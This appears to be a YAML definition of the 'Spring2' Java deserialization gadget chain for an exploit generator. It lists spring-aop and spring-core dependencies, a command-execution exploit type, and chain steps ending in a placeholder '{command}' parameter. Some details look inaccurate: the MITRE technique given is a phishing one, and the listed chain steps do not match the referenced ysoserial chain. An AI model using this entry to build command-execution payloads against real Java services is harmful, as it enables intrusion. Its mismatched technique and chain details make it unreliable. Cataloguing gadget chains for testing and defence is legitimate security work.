name: "Spring2"
category: "spring"
description: "Spring2 gadget chain using JdkDynamicAopProxy and MethodInterceptor"
jdk_version: "all"
dependencies:
  - name: "spring-aop"
    version: "4.0-4.3"
  - name: "spring-core"
    version: "4.0-4.3"
exploit_type: "command_execution"
payload_type: "command"
risk_level: 5
mitre_technique: "T1566.001"
references:
  - "https://github.com/frohoff/ysoserial"
steps:
  - class_name: "org.springframework.aop.framework.JdkDynamicAopProxy"
    method_name: "invoke"
    parameters: []
  - class_name: "org.springframework.aop.framework.AdvisedSupport"
    method_name: "getTargetSource"
    parameters: []
  - class_name: "org.springframework.beans.factory.config.MethodInvokingFactoryBean"
    method_name: "invoke"
    parameters:
      - "{command}"
